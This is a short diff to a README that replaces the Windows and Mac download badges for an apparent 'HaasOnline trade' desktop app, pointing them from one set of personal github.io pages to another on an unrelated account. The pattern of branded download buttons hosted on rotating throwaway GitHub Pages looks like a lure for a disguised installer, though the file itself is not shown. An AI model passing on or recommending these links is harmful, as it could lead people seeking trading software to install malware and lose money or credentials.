@@ -10,8 +10,8 @@
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-blue?style=for-the-badge&logo=windows)](https://haasonline-trade-desktop-app.github.io/.github)  
-[![Download for Mac](https://img.shields.io/badge/Download_for_Mac-silver?style=for-the-badge&logo=apple)](https://mitrobandus.github.io/.github/HaasOnline-trade)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-blue?style=for-the-badge&logo=windows)](https://izchaknomada.github.io/.github/haasonline-trade-app)  
+[![Download for Mac](https://img.shields.io/badge/Download_for_Mac-silver?style=for-the-badge&logo=apple)](https://izchaknomada.github.io/.github/haasonline-trade-app)
 
 </div>
 
